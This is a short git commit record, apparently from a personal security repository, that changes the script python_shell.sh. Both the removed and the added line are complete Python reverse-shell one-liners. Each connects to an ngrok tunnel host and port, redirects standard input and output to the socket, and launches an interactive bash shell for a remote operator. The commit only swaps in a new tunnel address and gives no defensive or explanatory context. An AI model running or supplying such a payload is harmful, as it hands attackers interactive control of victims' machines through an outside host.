373fc12009d7679ce097f61daed1ed67148f4273
admsec101 <161759937+admsec101@users.noreply.github.com>
2024-05-02 11:22:05 +0100

    Update python_shell.sh

--- python_shell.sh
+++ python_shell.sh
@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.eu.ngrok.io",11125));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.tcp.eu.ngrok.io",15620));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
